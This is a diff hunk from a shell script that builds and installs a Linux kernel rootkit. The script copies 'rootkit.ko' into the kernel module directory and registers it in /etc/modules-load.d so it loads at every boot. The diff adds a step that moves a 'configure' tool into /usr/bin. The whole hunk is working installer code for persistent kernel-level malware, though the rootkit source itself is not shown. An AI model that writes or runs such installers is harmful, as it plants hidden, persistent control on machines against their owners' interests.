@@ -11,6 +11,8 @@ echo "build rootkit for system..."
 make >/dev/null && echo "Rootkit built." || (echo "ERROR! unable to build rootkit" && exit)
 echo "install rootkit module ..."
 cp rootkit.ko /lib/modules/$(uname -r)/ && echo "installed rootkit module" || (echo "ERROR! could not install rootkit module" && exit)
+echo "install configuration tool..."
+mv configure /usr/bin/ && echo "installed configuration tool" || (echo "ERROR! could not install configuration tool." && exit)
 echo "enable rootkit module ..."
 echo "rootkit" > /etc/modules-load.d/rootkit.conf && echo "enabled rootkit module" || (echo "ERROR! could not enable rootkit" && exit)
 echo "cleanup"
